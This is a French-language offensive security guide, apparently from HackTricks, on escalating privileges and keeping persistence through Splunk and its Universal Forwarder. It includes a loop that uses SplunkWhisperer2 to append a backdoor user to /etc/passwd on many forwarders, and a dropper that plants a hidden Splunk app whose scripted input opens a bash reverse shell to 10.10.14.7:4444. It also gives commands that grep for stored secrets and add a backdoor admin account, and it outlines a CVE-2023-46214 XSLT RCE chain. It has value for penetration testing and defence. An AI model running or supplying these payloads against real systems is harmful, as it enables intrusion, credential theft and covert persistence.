# Splunk LPE et Persistence

{{#include ../../banners/hacktricks-training.md}}

Si, en **énumérant** une machine **en interne** ou **en externe**, vous trouvez **Splunk en cours d'exécution** (généralement **8000** pour l'interface web et **8089** pour l'API de gestion), des identifiants valides peuvent souvent être transformés en **code execution** via l'installation d'applications, les scripted inputs ou des actions de gestion.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Si Splunk s'exécute en tant que **root**, cela devient fréquemment une **élévation de privilèges** immédiate.<sup>[[1]](#references)</sup>

Si vous avez uniquement besoin de la surface d'attaque distante générique, de l'énumération ou du chemin RCE via l'upload d'une application, consultez :

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Si vous êtes **déjà root** et que le service Splunk n'écoute pas uniquement sur localhost, vous pouvez également voler les **hashes de mots de passe Splunk**, récupérer des **secrets chiffrés** ou déployer une **application malveillante** pour maintenir la persistence localement ou sur plusieurs forwarders.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Fichiers locaux intéressants

Lorsque vous obtenez un accès à un hôte exécutant Splunk ou Splunk Universal Forwarder, voici généralement les chemins les plus intéressants :<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artefacts importants :

- **`$SPLUNK_HOME/etc/passwd`** : utilisateurs Splunk locaux et hashes de mots de passe.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`** : clé utilisée par Splunk pour chiffrer les secrets stockés dans plusieurs fichiers `.conf`.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`** : fichier d'initialisation de l'administrateur ; utile dans les gold images et en cas d'erreurs de provisioning. Il est ignoré si `etc/passwd` existe déjà.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`** : emplacement où les scripted inputs sont généralement activés.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** ou **`$SPLUNK_HOME/etc/apps/`** : bons emplacements pour dissimuler une app persistante ou vérifier ce qui est déjà distribué.<sup>[[11]](#references)</sup>

## Résumé de l'exploit de l'agent Splunk Universal Forwarder

Pour plus de détails, consultez [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ceci est uniquement un résumé.<sup>[[1]](#references)</sup>

**Vue d'ensemble de l'exploit :**
Un exploit ciblant le Splunk Universal Forwarder (UF) permet aux attaquants disposant du **mot de passe de l'agent** d'exécuter du code arbitraire sur les systèmes exécutant l'agent, compromettant potentiellement une grande partie de l'environnement.<sup>[[1]](#references)</sup>

**Pourquoi cela fonctionne :**

- Le service de gestion de l'UF est généralement exposé sur le **TCP 8089**.<sup>[[6]](#references)</sup>
- Les attaquants peuvent s'authentifier auprès de l'API et ordonner au forwarder d'installer un **bundle d'app malveillant**.<sup>[[1]](#references)[[5]](#references)</sup>
- La même primitive peut être utilisée localement pour une **LPE** ou à distance pour une **RCE**.<sup>[[5]](#references)</sup>
- Des outils publics tels que **SplunkWhisperer2** créent automatiquement le bundle d'app et peuvent adapter les payloads aux cibles Linux.<sup>[[5]](#references)</sup>

**Méthodes courantes pour récupérer le mot de passe :**

- Identifiants en clair dans la documentation, les scripts, les partages ou l'automatisation du déploiement.<sup>[[1]](#references)</sup>
- Hashes de mots de passe dans `$SPLUNK_HOME/etc/passwd`, suivis d'un cracking offline.<sup>[[1]](#references)[[7]](#references)</sup>
- Gold images ou éléments résiduels du provisioning, tels que `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Impact :**

- Exécution de code au niveau SYSTEM/root sur chaque hôte compromis.<sup>[[1]](#references)</sup>
- Déploiement d'apps persistantes, de backdoors ou de ransomware.<sup>[[1]](#references)</sup>
- Désactivation ou altération de la télémétrie avant le forwarding des données.<sup>[[1]](#references)</sup>

**Exemple de commande pour l'exploitation :**

Le rapport original présente la boucle suivante pour envoyer un payload à plusieurs forwarders.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits publics utilisables :**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs ou applications malveillantes

Si vous disposez d'un **accès en écriture au système de fichiers** en tant que `root`/`splunk`, ou d'un accès authentifié pour installer des applications, un mécanisme de persistence très fiable consiste à déposer une **application personnalisée** contenant un **scripted input**.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> La documentation de Splunk indique elle-même que les scripted inputs doivent se trouver dans le répertoire d'une application et être activés depuis `inputs.conf`.<sup>[[10]](#references)</sup>

Structure typique :
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
`inputs.conf` minimal :<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper Linux rapide (en utilisant cette disposition d’application documentée) :<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes :

- La même technique fonctionne sur **Universal Forwarder** en utilisant `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
- Les attaquants se fondent souvent dans le décor en modifiant un add-on légitime plutôt qu'en créant une app manifestement malveillante.<sup>[[2]](#references)</sup>
- Sur un **deployment server**, déposer une app malveillante dans `deployment-apps/` devient une **persistence à l'échelle de la flotte**, car les forwarders interrogent le serveur, téléchargent les apps mises à jour et redémarrent souvent pour les appliquer.<sup>[[11]](#references)[[12]](#references)</sup>

## Vol d'identifiants et prise de contrôle de l'administration

Si vous pouvez lire les fichiers locaux de Splunk, deux objectifs sont généralement intéressants : récupérer l'accès **admin de Splunk** et récupérer les **identifiants de service chiffrés**.<sup>[[8]](#references)</sup>

### Hashes de mots de passe et utilisateurs locaux

Splunk stocke les données d'authentification locales dans `etc/passwd`. Selon le déploiement, le cracking de ce fichier peut permettre de récupérer des identifiants fonctionnels pour l'interface web et l'API de gestion.<sup>[[1]](#references)[[7]](#references)</sup>

Si vous disposez déjà d'identifiants **admin** valides et que Splunk utilise son backend d'authentification **native**, le CLI lui-même peut être utilisé pour la persistence.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` et valeurs chiffrées

Splunk utilise `etc/auth/splunk.secret` pour protéger les valeurs sensibles stockées dans plusieurs fichiers de configuration. Si vous pouvez voler à la fois le **secret** et les fichiers **`.conf`** concernés, vous pouvez souvent récupérer ou rejouer :<sup>[[8]](#references)</sup>

- les secrets partagés entre forwarder/indexer, tels que `pass4SymmKey`
- les mots de passe des clés privées TLS, tels que `sslPassword`
- les identifiants de bind LDAP, tels que `bindDNPassword`

Cela peut faciliter le **mouvement latéral**, même lorsque le mot de passe de l'administrateur Splunk lui-même ne peut pas être cracké.<sup>[[8]](#references)</sup>

### Abus de `user-seed.conf`

`user-seed.conf` n'est utilisé que lors du premier démarrage ou lorsque `etc/passwd` n'existe pas. Il est donc moins utile sur une machine active, mais très intéressant dans :<sup>[[9]](#references)</sup>

- des templates d'installation compromis
- des images de conteneurs
- des workflows de provisionnement non interactifs
- des appliances où Splunk est automatiquement réinitialisé

Dans ces cas, placer un `HASHED_PASSWORD` généré avec `splunk hash-passwd` vous permet de récupérer discrètement l'accès administrateur après un redeployment.<sup>[[9]](#references)</sup>

## Abus des requêtes Splunk

Pour plus de détails, consultez [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Une technique récente consiste à exploiter des **XSLT fournis par l'utilisateur** dans les versions vulnérables de Splunk Enterprise afin de transformer un compte authentifié disposant de faibles privilèges en **exécution de commandes OS** avec l'utilisateur `splunk`.<sup>[[3]](#references)[[4]](#references)</sup>

Déroulement général :<sup>[[3]](#references)[[4]](#references)</sup>

1. S'authentifier auprès de Splunk.
2. Téléverser un fichier **XSL** malveillant via la fonctionnalité de prévisualisation/téléversement.
3. Faire en sorte que Splunk affiche les résultats de recherche avec cette feuille de style téléversée depuis le répertoire **dispatch**.
4. Utiliser le payload XSLT pour écrire un fichier ou déclencher une exécution via le pipeline de recherche de Splunk, par exemple en atteignant une fonctionnalité interne telle que `runshellscript`.

L'élément offensif important à retenir est que cette voie permet une **RCE post-auth sans nécessiter d'app upload**. Sous Linux, elle vous donne généralement accès au compte **`splunk`**, ce qui reste précieux, car cet utilisateur possède souvent l'arborescence de l'application, peut lire les secrets et peut implanter des apps persistantes qui survivent à la perte du shell.<sup>[[3]](#references)[[4]](#references)</sup>

Un chemin représentatif utilisé pendant l'exploitation est :<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Si Splunk s’exécute avec trop de privilèges, ou si l’utilisateur `splunk` a accès à des scripts dangereux, à des unités de service accessibles en écriture ou à de mauvaises règles `sudo`, cela devient une chaîne **LPE** nette.

## References

- [1] [Abuser des Splunk Forwarders pour obtenir une RCE et assurer la persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Méfiez-vous de TraitorWare : utiliser Splunk pour assurer la persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Avis de sécurité Splunk SVD-2023-1104 – RCE par injection XSLT (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Analyse de CVE-2023-46214 : RCE par injection XSLT dans Splunk](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Modifier les valeurs par défaut](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Déployer des mots de passe sécurisés sur plusieurs serveurs](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Configurer une scripted input](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Créer des deployment apps](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Comment se déroulent les mises à jour du déploiement](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Configurer les utilisateurs avec la CLI](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
